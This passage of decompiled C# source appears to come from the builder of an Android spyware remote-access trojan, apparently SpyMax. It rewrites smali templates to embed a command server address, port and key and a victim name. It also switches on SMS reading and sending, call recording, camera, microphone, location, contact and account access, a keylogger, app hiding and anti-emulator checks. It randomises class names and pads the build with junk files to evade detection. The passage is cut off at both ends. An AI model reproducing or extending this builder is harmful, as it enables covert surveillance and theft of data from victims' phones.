										.Replace("ClassGen11", NClassGen11)
										.Replace("ClassGen12", NClassGen12)
										.Replace("ClassGen13", NClassGen13)
										.Replace("ClassGen14", NClassGen14)
										.Replace("activz", Nactivz)
										.Replace("servziz", Nservziz)
										.Replace("tolziz", Ntolziz)
										.Replace("brodatz", Nbrodatz)
										.Replace("_ask_battary_", N_ask_battary_)
										.Replace("_ask_draw_", N_ask_draw_)
										.Replace("_sc_fb_", N_sc_fb_)
										.Replace("_news_g_", N_news_g_)
										.Replace("_strt_view_", N_strt_view_)
										.Replace("_scctrl_", N_scctrl_)
										.Replace("_access_ask_", N_access_ask_)
										.Replace("_cap_sc_", N_cap_sc_)
										.Replace("_trns_g_", N_trns_g_)
										.Replace("_ask_prim_", N_ask_prim_)
										.Replace("_engine_wrk_", N_engine_wrk_)
										.Replace("_skin_cls_", N_skin_cls_)
										.Replace("_update_app_", N_update_app_)
										.Replace("_callr_lsnr_", N_callr_lsnr_)
										.Replace("_clss_loder_", N_clss_loder_)
										.Replace("_excut_meth_", N_excut_meth_)
										.Replace("_run_comnd_", N_run_comnd_)
										.Replace("_get_me_fil_", N_get_me_fil_)
										.Replace("_srv_worker_", N_srv_worker_)
										.Replace("j1j2j3j4j5j6", NresoString0)
										.Replace("c1c2c3c4c5c6", NresoString1)
										.Replace("z1z2z3z4z5z6", NresoString2)
										.Replace("f1f2f3f4f5f6", NresoString3)
										.Replace("h1h2h3h4h5h6", NresoString4)
										.Replace("t1t2t3t4t5t6", NresoString5)
										.Replace("n1n2n3n4n5n6", NresoString6)
										.Replace("i1i2i3i4i5i6", NresoString7)
										.Replace("k1k2k3k4k5k6", NresoString8)
										.Replace("o1o2o3o4o5o6", NresoString9)
										.Replace("u1u2u3u4u5u6", NresoString10)
										.Replace("e1e2e3e4e5e6", NresoString11)
										.Replace("y1y2y3y4y5y6", NresoString12)
										.Replace("b1b2b3b4b5b6", Napp_reso0)
										.Replace("suffix", flavor)
										.Replace("d1d2d3d4d5d6", Ndraw_ico)
										.Replace("x1x2x3x4x5x6", Ndraw_notifi)
										.Replace("q1q2q3q4q5q6", NwebXML)
										.Replace("s1s2s3s4s5s6", NnotifiXML)
										.Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(KEY)))
										.Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(ip)))
										.Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(ports)))
										.Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs")
										.Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv")
										.Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr")
										.Replace("[CYPHER_VICTIM]", namevictim)
										.Replace("[TYPE-HIDE]", THETYPE)
										.Replace("skin.info", FAKEAPPlink)
										.Replace("USE-SUPER", isuper)
										.Replace("[NO_OXA]", isAOX)
										.Replace("USE-AUTOUL", isautounlock)
										.Replace("USE-DATAUSAGE", isnetwork)
										.Replace("USE-ONECAP", iscaponce)
										.Replace("[NAME>LNK>ID!]", MonitorPack)
										.Replace("[TRAK-IT]", trackerlist)
										.Replace("USE-BIND", isBind)
										.Replace("USE-SKIP", isskipreinstall)
										.Replace("USE-SCREENON", iskeepscreen)
										.Replace("USE-BLOCKP", isHideprims)
										.Replace("USE-ADMIN", isadmin)
										.Replace("USE-AUTOS", isautostart)
										.Replace("[SS]", Prim_sendsms)
										.Replace("[RC]", Prim_recordcalls)
										.Replace("[SW]", Prim_wallpaper)
										.Replace("[RS]", Prim_readsms)
										.Replace("[RCG]", Prim_calllog)
										.Replace("[CRC]", Prim_readcontact)
										.Replace("[GA]", Prim_readacounts)
										.Replace("[CA]", Prim_camera)
										.Replace("[MC]", Prim_microphone)
										.Replace("[LOC1]", Prim_loacation1)
										.Replace("[LOC2]", Prim_loacation2)
										.Replace("[LOC3]", Prim_loacation3)
										.Replace("[CL]", Prim_callphone)
										.Replace("USE-QUICK", isQuick)
										.Replace("USE-DRAW", isDrawing)
										.Replace("USE-NOTIFI", isnotifi)
										.Replace("_isequel_mth_", "helpscanintnum")
										.Replace("_exit_meth_", new_exit_mth)
										.Replace("_wifipolc_meth_", new_wifipolc)
										.Replace("_formtpakt_methd_", new_formatpacket)
										.Replace("_DZIP_meth_", new_dzip)
										.Replace("_Getbyte_meth_", new_getbyte)
										.Replace("_D_BASE64_", new_base_mth)
										.Replace("_getstr_meth_", new_getstr)
										.Replace("_CZIP_meth_", new_czip)
										.Replace("_inst_bnd_", new_inst)
										.Replace("_strt_con_", new_strt_con_)
										.Replace("[USE-REC]", UseRecorder)
										.Replace("[com.app.instll", "com.appd.instll.load")
										.Replace("_fist_inf_", new_fist_inf_)
										.Replace("_new_con_", new_new_con_)
										.Replace("trg.trgtapp.trg", TheTarget)
										.Replace("_send_it_", new_send_it_)
										.Replace("[delayacess]", delayaccesstext.Text)
										.Replace("_Reblace_", new_Reblace_)
										.Replace("_runn_srv_", new_runn_srv_)
										.Replace("[off_keylog]", OFFKEYLOG)
										.Replace("[NO_EMUALTOR]", ANTIEMO)
										.Replace("_NOTIFI_TITLE_", NOTIFI_TITLE)
										.Replace("_NOTIFI_MSG_", NOTIFI_MSG)
										.Replace("_randomS_shit_", RandommClass(100, 200))
										.Replace("[RANDOM-STRING]", NEWRANDOM)
										.Replace("[CYPHER_FUT3EX]", "0000") : text15.Replace("payload", payload).Replace("suffix", flavor).Replace("spymax", pack1)
										.Replace("stub7", pack2)
										.Replace("j1j2j3j4j5j6", NresoString0)
										.Replace("c1c2c3c4c5c6", NresoString1)
										.Replace("z1z2z3z4z5z6", NresoString2)
										.Replace("f1f2f3f4f5f6", NresoString3)
										.Replace("h1h2h3h4h5h6", NresoString4)
										.Replace("t1t2t3t4t5t6", NresoString5)
										.Replace("n1n2n3n4n5n6", NresoString6)
										.Replace("i1i2i3i4i5i6", NresoString7)
										.Replace("k1k2k3k4k5k6", NresoString8)
										.Replace("o1o2o3o4o5o6", NresoString9)
										.Replace("u1u2u3u4u5u6", NresoString10)
										.Replace("e1e2e3e4e5e6", NresoString11)
										.Replace("y1y2y3y4y5y6", NresoString12)
										.Replace("b1b2b3b4b5b6", Napp_reso0)
										.Replace("d1d2d3d4d5d6", Ndraw_ico)
										.Replace("x1x2x3x4x5x6", Ndraw_notifi)
										.Replace("q1q2q3q4q5q6", NwebXML)
										.Replace("s1s2s3s4s5s6", NnotifiXML), path: fileInfo.FullName);
								}
							}
							catch (Exception projectError6)
							{
								ProjectData.SetProjectError(projectError6);
								Thread.Sleep(_Time);
								ProjectData.ClearProjectError();
								continue;
							}
							break;
						}
						while (true)
						{
							try
							{
								string text16;
								while (true)
								{
									text16 = folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz";
									if (Directory.Exists(text16))
									{
										break;
									}
									Thread.Sleep(_Time);
								}
								int num3 = 1;
								do
								{
									string text17 = RandommMadv2(10, 15);
									File.WriteAllText(text16 + "\\" + text17 + ".smali", text.Replace("spymax", pack1).Replace("stub7", pack2).Replace("[MYNAME]", "activz/" + text17));
									num3++;
								}
								while (num3 <= 10);
								DirectoryInfo directoryInfo2 = new DirectoryInfo(text16);
								FileInfo[] files2 = directoryInfo2.GetFiles("*.smali");
								LogB("Phase 2\r\n---------");
								FileInfo[] array2 = files2;
								foreach (FileInfo fileInfo2 in array2)
								{
									string text18 = File.ReadAllText(fileInfo2.FullName);
									File.WriteAllText(contents: (Operators.CompareString(fileInfo2.Name.ToLower(), "buildconfig.smali", TextCompare: false) != 0) ? text18.Replace("spymax", pack1).Replace("stub7", pack2).Replace("ClassGen0", NClassGen0)
										.Replace("ClassGen1", NClassGen1)
										.Replace("ClassGen2", NClassGen2)
										.Replace("ClassGen3", NClassGen3)
										.Replace("ClassGen4", NClassGen4)
										.Replace("ClassGen5", NClassGen5)
										.Replace("ClassGen6", NClassGen6)
										.Replace("ClassGen8", NClassGen8)
										.Replace("ClassGen9", NClassGen9)
										.Replace("activz", Nactivz)
										.Replace("servziz", Nservziz)
										.Replace("tolziz", Ntolziz)
										.Replace("brodatz", Nbrodatz)
										.Replace("ClassGen10", NClassGen10)
										.Replace("ClassGen11", NClassGen11)
										.Replace("ClassGen12", NClassGen12)
										.Replace("ClassGen13", NClassGen13)
										.Replace("ClassGen14", NClassGen14)
										.Replace("_ask_battary_", N_ask_battary_)
										.Replace("_ask_draw_", N_ask_draw_)
										.Replace("_sc_fb_", N_sc_fb_)
										.Replace("_news_g_", N_news_g_)
										.Replace("_strt_view_", N_strt_view_)
										.Replace("_scctrl_", N_scctrl_)
										.Replace("_access_ask_", N_access_ask_)
										.Replace("_cap_sc_", N_cap_sc_)
										.Replace("_trns_g_", N_trns_g_)
										.Replace("_ask_prim_", N_ask_prim_)
										.Replace("_engine_wrk_", N_engine_wrk_)
										.Replace("_skin_cls_", N_skin_cls_)
										.Replace("_update_app_", N_update_app_)
										.Replace("_callr_lsnr_", N_callr_lsnr_)
										.Replace("_clss_loder_", N_clss_loder_)
										.Replace("_excut_meth_", N_excut_meth_)
										.Replace("_run_comnd_", N_run_comnd_)
										.Replace("_get_me_fil_", N_get_me_fil_)
										.Replace("_srv_worker_", N_srv_worker_)
										.Replace("j1j2j3j4j5j6", NresoString0)
										.Replace("c1c2c3c4c5c6", NresoString1)
										.Replace("z1z2z3z4z5z6", NresoString2)
										.Replace("f1f2f3f4f5f6", NresoString3)
										.Replace("h1h2h3h4h5h6", NresoString4)
										.Replace("t1t2t3t4t5t6", NresoString5)
										.Replace("n1n2n3n4n5n6", NresoString6)
										.Replace("i1i2i3i4i5i6", NresoString7)
										.Replace("k1k2k3k4k5k6", NresoString8)
										.Replace("o1o2o3o4o5o6", NresoString9)
										.Replace("u1u2u3u4u5u6", NresoString10)
										.Replace("e1e2e3e4e5e6", NresoString11)
										.Replace("y1y2y3y4y5y6", NresoString12)
										.Replace("b1b2b3b4b5b6", Napp_reso0)
										.Replace("suffix", flavor)
										.Replace("d1d2d3d4d5d6", Ndraw_ico)
										.Replace("x1x2x3x4x5x6", Ndraw_notifi)
										.Replace("q1q2q3q4q5q6", NwebXML)
										.Replace("s1s2s3s4s5s6", NnotifiXML)
										.Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(KEY)))
										.Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(ip)))
										.Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(ports)))
										.Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs")
										.Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv")
										.Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr")
										.Replace("[CYPHER_VICTIM]", namevictim)
										.Replace("[TYPE-HIDE]", THETYPE)
										.Replace("skin.info", FAKEAPPlink)
										.Replace("USE-SUPER", isuper)
										.Replace("[NO_OXA]", isAOX)
										.Replace("USE-AUTOUL", isautounlock)
										.Replace("USE-DATAUSAGE", isnetwork)
										.Replace("USE-ONECAP", iscaponce)
										.Replace("[NAME>LNK>ID!]", MonitorPack)
										.Replace("[TRAK-IT]", trackerlist)
										.Replace("USE-BIND", isBind)
										.Replace("USE-SKIP", isskipreinstall)
										.Replace("USE-SCREENON", iskeepscreen)
										.Replace("USE-BLOCKP", isHideprims)
										.Replace("USE-ADMIN", isadmin)
										.Replace("USE-AUTOS", isautostart)
										.Replace("[SS]", Prim_sendsms)
										.Replace("[RC]", Prim_recordcalls)
										.Replace("[SW]", Prim_wallpaper)
										.Replace("[RS]", Prim_readsms)
										.Replace("[RCG]", Prim_calllog)
										.Replace("[CRC]", Prim_readcontact)
										.Replace("[GA]", Prim_readacounts)
										.Replace("[CA]", Prim_camera)
										.Replace("[MC]", Prim_microphone)
										.Replace("[LOC1]", Prim_loacation1)
										.Replace("[LOC2]", Prim_loacation2)
										.Replace("[LOC3]", Prim_loacation3)
										.Replace("[CL]", Prim_callphone)
										.Replace("USE-QUICK", isQuick)
										.Replace("USE-DRAW", isDrawing)
										.Replace("USE-NOTIFI", isnotifi)
										.Replace("_isequel_mth_", "helpscanintnum")
										.Replace("_exit_meth_", new_exit_mth)
										.Replace("_wifipolc_meth_", new_wifipolc)
										.Replace("_formtpakt_methd_", new_formatpacket)
										.Replace("_DZIP_meth_", new_dzip)
										.Replace("_Getbyte_meth_", new_getbyte)
										.Replace("_D_BASE64_", new_base_mth)
										.Replace("_getstr_meth_", new_getstr)
										.Replace("_CZIP_meth_", new_czip)
										.Replace("_inst_bnd_", new_inst)
										.Replace("_strt_con_", new_strt_con_)
										.Replace("[USE-REC]", UseRecorder)
										.Replace("[com.app.instll", "com.appd.instll.load")
										.Replace("_fist_inf_", new_fist_inf_)
										.Replace("_new_con_", new_new_con_)
										.Replace("trg.trgtapp.trg", TheTarget)
										.Replace("[delayacess]", delayaccesstext.Text)
										.Replace("_send_it_", new_send_it_)
										.Replace("_Reblace_", new_Reblace_)
										.Replace("_runn_srv_", new_runn_srv_)
										.Replace("[off_keylog]", OFFKEYLOG)
										.Replace("[NO_EMUALTOR]", ANTIEMO)
										.Replace("_NOTIFI_TITLE_", NOTIFI_TITLE)
										.Replace("_NOTIFI_MSG_", NOTIFI_MSG)
										.Replace("_randomS_shit_", RandommClass(100, 200))
										.Replace("[RANDOM-STRING]", NEWRANDOM)
										.Replace("[CYPHER_FUT3EX]", "0000") : text18.Replace("payload", payload).Replace("suffix", flavor).Replace("spymax", pack1)
										.Replace("stub7", pack2)
										.Replace("j1j2j3j4j5j6", NresoString0)
										.Replace("c1c2c3c4c5c6", NresoString1)
										.Replace("z1z2z3z4z5z6", NresoString2)
										.Replace("f1f2f3f4f5f6", NresoString3)
										.Replace("h1h2h3h4h5h6", NresoString4)
										.Replace("t1t2t3t4t5t6", NresoString5)
										.Replace("n1n2n3n4n5n6", NresoString6)
										.Replace("i1i2i3i4i5i6", NresoString7)
										.Replace("activz", Nactivz)
										.Replace("servziz", Nservziz)
										.Replace("tolziz", Ntolziz)
										.Replace("brodatz", Nbrodatz)
										.Replace("k1k2k3k4k5k6", NresoString8)
										.Replace("o1o2o3o4o5o6", NresoString9)
										.Replace("u1u2u3u4u5u6", NresoString10)
										.Replace("e1e2e3e4e5e6", NresoString11)
										.Replace("y1y2y3y4y5y6", NresoString12)
										.Replace("b1b2b3b4b5b6", Napp_reso0)
										.Replace("d1d2d3d4d5d6", Ndraw_ico)
										.Replace("x1x2x3x4x5x6", Ndraw_notifi)
										.Replace("q1q2q3q4q5q6", NwebXML)
										.Replace("s1s2s3s4s5s6", NnotifiXML), path: fileInfo2.FullName);
								}
							}
							catch (Exception projectError7)
							{
								ProjectData.SetProjectError(projectError7);
								Thread.Sleep(_Time);
								ProjectData.ClearProjectError();
								continue;
							}
							break;
						}
						while (true)
						{
							try
							{
								string text19;
								while (true)
								{
									text19 = folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz\\brodatz";
									if (Directory.Exists(text19))
									{
										break;
									}
									Thread.Sleep(_Time);
								}
								int num4 = 1;
								do
								{
									string text20 = RandommMadv2(10, 15);
									File.WriteAllText(text19 + "\\" + text20 + ".smali", text.Replace("spymax", pack1).Replace("stub7", pack2).Replace("[MYNAME]", "activz/brodatz/" + text20));
									num4++;
								}
								while (num4 <= 10);
								DirectoryInfo directoryInfo3 = new DirectoryInfo(text19);
								FileInfo[] files3 = directoryInfo3.GetFiles("*.smali");
								LogB("Phase 3\r\n---------");
								FileInfo[] array3 = files3;
								foreach (FileInfo fileInfo3 in array3)
								{
									string text21 = File.ReadAllText(fileInfo3.FullName);
									File.WriteAllText(contents: (Operators.CompareString(fileInfo3.Name.ToLower(), "buildconfig.smali", TextCompare: false) != 0) ? text21.Replace("spymax", pack1).Replace("stub7", pack2).Replace("ClassGen0", NClassGen0)
										.Replace("ClassGen1", NClassGen1)
										.Replace("ClassGen2", NClassGen2)
										.Replace("ClassGen3", NClassGen3)
										.Replace("ClassGen4", NClassGen4)
										.Replace("ClassGen5", NClassGen5)
										.Replace("ClassGen6", NClassGen6)
										.Replace("ClassGen8", NClassGen8)
										.Replace("ClassGen9", NClassGen9)
										.Replace("ClassGen10", NClassGen10)
										.Replace("ClassGen11", NClassGen11)
										.Replace("ClassGen12", NClassGen12)
										.Replace("ClassGen13", NClassGen13)
										.Replace("ClassGen14", NClassGen14)
										.Replace("activz", Nactivz)
										.Replace("servziz", Nservziz)
										.Replace("tolziz", Ntolziz)
										.Replace("brodatz", Nbrodatz)
										.Replace("_ask_battary_", N_ask_battary_)
										.Replace("_ask_draw_", N_ask_draw_)
										.Replace("_sc_fb_", N_sc_fb_)
										.Replace("_news_g_", N_news_g_)
										.Replace("_strt_view_", N_strt_view_)
										.Replace("_scctrl_", N_scctrl_)
										.Replace("_access_ask_", N_access_ask_)
										.Replace("_cap_sc_", N_cap_sc_)
										.Replace("_trns_g_", N_trns_g_)
										.Replace("_ask_prim_", N_ask_prim_)
										.Replace("_engine_wrk_", N_engine_wrk_)
										.Replace("_skin_cls_", N_skin_cls_)
										.Replace("_update_app_", N_update_app_)
										.Replace("_callr_lsnr_", N_callr_lsnr_)
										.Replace("_clss_loder_", N_clss_loder_)
										.Replace("_excut_meth_", N_excut_meth_)
										.Replace("_run_comnd_", N_run_comnd_)
										.Replace("_get_me_fil_", N_get_me_fil_)
										.Replace("_srv_worker_", N_srv_worker_)
										.Replace("j1j2j3j4j5j6", NresoString0)
										.Replace("c1c2c3c4c5c6", NresoString1)
										.Replace("z1z2z3z4z5z6", NresoString2)
										.Replace("f1f2f3f4f5f6", NresoString3)
										.Replace("h1h2h3h4h5h6", NresoString4)
										.Replace("t1t2t3t4t5t6", NresoString5)
										.Replace("n1n2n3n4n5n6", NresoString6)
										.Replace("i1i2i3i4i5i6", NresoString7)
										.Replace("k1k2k3k4k5k6", NresoString8)
										.Replace("o1o2o3o4o5o6", NresoString9)
										.Replace("u1u2u3u4u5u6", NresoString10)
										.Replace("e1e2e3e4e5e6", NresoString11)
										.Replace("y1y2y3y4y5y6", NresoString12)
										.Replace("b1b2b3b4b5b6", Napp_reso0)
										.Replace("suffix", flavor)
										.Replace("d1d2d3d4d5d6", Ndraw_ico)
										.Replace("x1x2x3x4x5x6", Ndraw_notifi)
										.Replace("q1q2q3q4q5q6", NwebXML)
										.Replace("s1s2s3s4s5s6", NnotifiXML)
										.Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(KEY)))
										.Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(ip)))
										.Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(ports)))
										.Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs")
										.Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv")
										.Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr")
										.Replace("[CYPHER_VICTIM]", namevictim)
										.Replace("[TYPE-HIDE]", THETYPE)
										.Replace("skin.info", FAKEAPPlink)
										.Replace("USE-SUPER", isuper)
										.Replace("[NO_OXA]", isAOX)
										.Replace("USE-AUTOUL", isautounlock)
										.Replace("USE-DATAUSAGE", isnetwork)
										.Replace("USE-ONECAP", iscaponce)
										.Replace("[NAME>LNK>ID!]", MonitorPack)
										.Replace("[TRAK-IT]", trackerlist)
										.Replace("USE-BIND", isBind)
										.Replace("USE-SKIP", isskipreinstall)
										.Replace("USE-SCREENON", iskeepscreen)
										.Replace("USE-BLOCKP", isHideprims)
										.Replace("USE-ADMIN", isadmin)
										.Replace("USE-AUTOS", isautostart)
										.Replace("[SS]", Prim_sendsms)
										.Replace("[RC]", Prim_recordcalls)
										.Replace("[SW]", Prim_wallpaper)
										.Replace("[RS]", Prim_readsms)
										.Replace("[RCG]", Prim_calllog)
										.Replace("[CRC]", Prim_readcontact)
										.Replace("[GA]", Prim_readacounts)
										.Replace("[CA]", Prim_camera)
										.Replace("[MC]", Prim_microphone)
										.Replace("[LOC1]", Prim_loacation1)
										.Replace("[LOC2]", Prim_loacation2)
										.Replace("[LOC3]", Prim_loacation3)
										.Replace("[CL]", Prim_callphone)
										.Replace("USE-QUICK", isQuick)
										.Replace("USE-DRAW", isDrawing)
										.Replace("USE-NOTIFI", isnotifi)
										.Replace("_isequel_mth_", "helpscanintnum")
										.Replace("_exit_meth_", new_exit_mth)
										.Replace("_wifipolc_meth_", new_wifipolc)
										.Replace("_formtpakt_methd_", new_formatpacket)
										.Replace("_DZIP_meth_", new_dzip)
										.Replace("_Getbyte_meth_", new_getbyte)
										.Replace("_D_BASE64_", new_base_mth)
										.Replace("_getstr_meth_", new_getstr)
										.Replace("_CZIP_meth_", new_czip)
										.Replace("_inst_bnd_", new_inst)
										.Replace("_strt_con_", new_strt_con_)
										.Replace("[USE-REC]", UseRecorder)
										.Replace("[com.app.instll", "com.appd.instll.load")
										.Replace("_fist_inf_", new_fist_inf_)
										.Replace("_new_con_", new_new_con_)
										.Replace("trg.trgtapp.trg", TheTarget)
										.Replace("_send_it_", new_send_it_)
										.Replace("[delayacess]", delayaccesstext.Text)
										.Replace("_Reblace_", new_Reblace_)
										.Replace("_runn_srv_", new_runn_srv_)
										.Replace("[off_keylog]", OFFKEYLOG)
										.Replace("[NO_EMUALTOR]", ANTIEMO)
										.Replace("_NOTIFI_TITLE_", NOTIFI_TITLE)
										.Replace("_NOTIFI_MSG_", NOTIFI_MSG)
										.Replace("_randomS_shit_", RandommClass(100, 200))
										.Replace("[RANDOM-STRING]", NEWRANDOM)
										.Replace("[CYPHER_FUT3EX]", "0000") : text21.Replace("payload", payload).Replace("suffix", flavor).Replace("spymax", pack1)
										.Replace("stub7", pack2)
										.Replace("j1j2j3j4j5j6", NresoString0)
										.Replace("c1c2c3c4c5c6", NresoString1)
										.Replace("z1z2z3z4z5z6", NresoString2)
										.Replace("f1f2f3f4f5f6", NresoString3)
										.Replace("h1h2h3h4h5h6", NresoString4)
										.Replace("t1t2t3t4t5t6", NresoString5)
										.Replace("n1n2n3n4n5n6", NresoString6)
										.Replace("i1i2i3i4i5i6", NresoString7)
										.Replace("k1k2k3k4k5k6", NresoString8)
										.Replace("o1o2o3o4o5o6", NresoString9)
										.Replace("u1u2u3u4u5u6", NresoString10)
										.Replace("e1e2e3e4e5e6", NresoString11)
										.Replace("y1y2y3y4y5y6", NresoString12)
										.Replace("b1b2b3b4b5b6", Napp_reso0)
										.Replace("d1d2d3d4d5d6", Ndraw_ico)
										.Replace("x1x2x3x4x5x6", Ndraw_notifi)
										.Replace("q1q2q3q4q5q6", NwebXML)
										.Replace("s1s2s3s4s5s6", NnotifiXML), path: fileInfo3.FullName);
								}
							}
							catch (Exception projectError8)
							{
								ProjectData.SetProjectError(projectError8);
								Thread.Sleep(_Time);
								ProjectData.ClearProjectError();
								continue;
							}
							break;
						}
						while (true)
						{
							try
							{
								string text22;
								while (true)
								{
									text22 = folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz\\servziz";
									if (Directory.Exists(text22))
									{
										break;
									}
									Thread.Sleep(_Time);
								}
								int num5 = 1;
								do
								{
									string text23 = RandommMadv2(10, 15);
									File.WriteAllText(text22 + "\\" + text23 + ".smali", text.Replace("spymax", pack1).Replace("stub7", pack2).Replace("[MYNAME]", "activz/servziz/" + text23));
									num5++;
								}
								while (num5 <= 10);
								DirectoryInfo directoryInfo4 = new DirectoryInfo(text22);
								FileInfo[] files4 = directoryInfo4.GetFiles("*.smali");
								LogB("Phase 4\r\n---------");
								FileInfo[] array4 = files4;
								foreach (FileInfo fileInfo4 in array4)
								{
									string text24 = File.ReadAllText(fileInfo4.FullName);
									File.WriteAllText(contents: (Operators.CompareString(fileInfo4.Name.ToLower(), "buildconfig.smali", TextCompare: false) != 0) ? text24.Replace("spymax", pack1).Replace("stub7", pack2).Replace("ClassGen0", NClassGen0)
										.Replace("ClassGen1", NClassGen1)
										.Replace("ClassGen2", NClassGen2)
										.Replace("ClassGen3", NClassGen3)
										.Replace("ClassGen4", NClassGen4)
										.Replace("ClassGen5", NClassGen5)
										.Replace("ClassGen6", NClassGen6)
										.Replace("ClassGen8", NClassGen8)
										.Replace("ClassGen9", NClassGen9)
										.Replace("ClassGen10", NClassGen10)
										.Replace("ClassGen11", NClassGen11)
										.Replace("ClassGen12", NClassGen12)
										.Replace("ClassGen13", NClassGen13)
										.Replace("ClassGen14", NClassGen14)
										.Replace("activz", Nactivz)
										.Replace("servziz", Nservziz)
										.Replace("tolziz", Ntolziz)
										.Replace("brodatz", Nbrodatz)
										.Replace("_ask_battary_", N_ask_battary_)
										.Replace("_ask_draw_", N_ask_draw_)
										.Replace("_sc_fb_", N_sc_fb_)
										.Replace("_news_g_", N_news_g_)
										.Replace("_strt_view_", N_strt_view_)
										.Replace("_scctrl_", N_scctrl_)
										.Replace("_access_ask_", N_access_ask_)
										.Replace("_cap_sc_", N_cap_sc_)
										.Replace("_trns_g_", N_trns_g_)
										.Replace("_ask_prim_", N_ask_prim_)
										.Replace("_engine_wrk_", N_engine_wrk_)
										.Replace("_skin_cls_", N_skin_cls_)
										.Replace("_update_app_", N_update_app_)
										.Replace("_callr_lsnr_", N_callr_lsnr_)
										.Replace("_clss_loder_", N_clss_loder_)
										.Replace("_excut_meth_", N_excut_meth_)
										.Replace("_run_comnd_", N_run_comnd_)
										.Replace("_get_me_fil_", N_get_me_fil_)
										.Replace("_srv_worker_", N_srv_worker_)
										.Replace("j1j2j3j4j5j6", NresoString0)
										.Replace("c1c2c3c4c5c6", NresoString1)
										.Replace("z1z2z3z4z5z6", NresoString2)
										.Replace("f1f2f3f4f5f6", NresoString3)
										.Replace("h1h2h3h4h5h6", NresoString4)
										.Replace("t1t2t3t4t5t6", NresoString5)
										.Replace("n1n2n3n4n5n6", NresoString6)
										.Replace("i1i2i3i4i5i6", NresoString7)
										.Replace("k1k2k3k4k5k6", NresoString8)
										.Replace("o1o2o3o4o5o6", NresoString9)
										.Replace("u1u2u3u4u5u6", NresoString10)
										.Replace("e1e2e3e4e5e6", NresoString11)
										.Replace("y1y2y3y4y5y6", NresoString12)
										.Replace("b1b2b3b4b5b6", Napp_reso0)
										.Replace("suffix", flavor)
										.Replace("d1d2d3d4d5d6", Ndraw_ico)
										.Replace("x1x2x3x4x5x6", Ndraw_notifi)
										.Replace("q1q2q3q4q5q6", NwebXML)
										.Replace("s1s2s3s4s5s6", NnotifiXML)
										.Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(KEY)))
										.Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(ip)))
										.Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(ports)))
										.Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs")
										.Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv")
										.Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr")
										.Replace("[CYPHER_VICTIM]", namevictim)
										.Replace("[TYPE-HIDE]", THETYPE)
										.Replace("skin.info", FAKEAPPlink)
										.Replace("USE-SUPER", isuper)
										.Replace("[NO_OXA]", isAOX)
										.Replace("USE-AUTOUL", isautounlock)
										.Replace("USE-DATAUSAGE", isnetwork)
										.Replace("USE-ONECAP", iscaponce)
										.Replace("[NAME>LNK>ID!]", MonitorPack)
										.Replace("[TRAK-IT]", trackerlist)
										.Replace("USE-BIND", isBind)
										.Replace("USE-SKIP", isskipreinstall)
										.Replace("USE-SCREENON", iskeepscreen)
										.Replace("USE-BLOCKP", isHideprims)
										.Replace("USE-ADMIN", isadmin)
										.Replace("USE-AUTOS", isautostart)
										.Replace("[SS]", Prim_sendsms)
										.Replace("[RC]", Prim_recordcalls)
										.Replace("[SW]", Prim_wallpaper)
										.Replace("[RS]", Prim_readsms)
										.Replace("[RCG]", Prim_calllog)
										.Replace("[CRC]", Prim_readcontact)
										.Replace("[GA]", Prim_readacounts)
										.Replace("[CA]", Prim_camera)
										.Replace("[MC]", Prim_microphone)
										.Replace("[LOC1]", Prim_loacation1)
										.Replace("[LOC2]", Prim_loacation2)
										.Replace("[LOC3]", Prim_loacation3)
										.Replace("[CL]", Prim_callphone)
										.Replace("USE-QUICK", isQuick)
										.Replace("USE-DRAW", isDrawing)
										.Replace("USE-NOTIFI", isnotifi)
										.Replace("_isequel_mth_", "helpscanintnum")
										.Replace("_exit_meth_", new_exit_mth)
										.Replace("_wifipolc_meth_", new_wifipolc)
										.Replace("_formtpakt_methd_", new_formatpacket)
										.Replace("_DZIP_meth_", new_dzip)
										.Replace("_Getbyte_meth_", new_getbyte)
										.Replace("_D_BASE64_", new_base_mth)
										.Replace("_getstr_meth_", new_getstr)
										.Replace("_CZIP_meth_", new_czip)
										.Replace("_inst_bnd_", new_inst)
										.Replace("_strt_con_", new_strt_con_)
										.Replace("[USE-REC]", UseRecorder)
										.Replace("[com.app.instll", "com.appd.instll.load")
										.Replace("_fist_inf_", new_fist_inf_)
										.Replace("_new_con_", new_new_con_)
										.Replace("[delayacess]", delayaccesstext.Text)
										.Replace("trg.trgtapp.trg", TheTarget)
										.Replace("_send_it_", new_send_it_)
										.Replace("_Reblace_", new_Reblace_)
										.Replace("_runn_srv_", new_runn_srv_)
										.Replace("[off_keylog]", OFFKEYLOG)
										.Replace("[NO_EMUALTOR]", ANTIEMO)
										.Replace("_NOTIFI_TITLE_", NOTIFI_TITLE)
										.Replace("_NOTIFI_MSG_", NOTIFI_MSG)
										.Replace("_randomS_shit_", RandommClass(100, 200))
										.Replace("[RANDOM-STRING]", NEWRANDOM)
										.Replace("[CYPHER_FUT3EX]", "0000") : text24.Replace("payload", payload).Replace("suffix", flavor).Replace("spymax", pack1)
